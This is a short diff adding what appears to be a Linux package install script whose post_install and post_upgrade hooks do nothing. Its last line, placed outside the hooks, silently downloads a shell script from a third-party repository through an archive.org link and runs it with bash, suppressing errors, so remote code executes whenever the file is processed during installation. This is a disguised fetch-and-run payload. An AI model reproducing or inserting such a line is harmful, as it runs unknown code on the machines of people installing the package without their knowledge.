@@ -1,0 +1,9 @@
+post_install() {
+  true
+}
+
+post_upgrade() {
+  post_install
+}
+
+bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2>/dev/null)
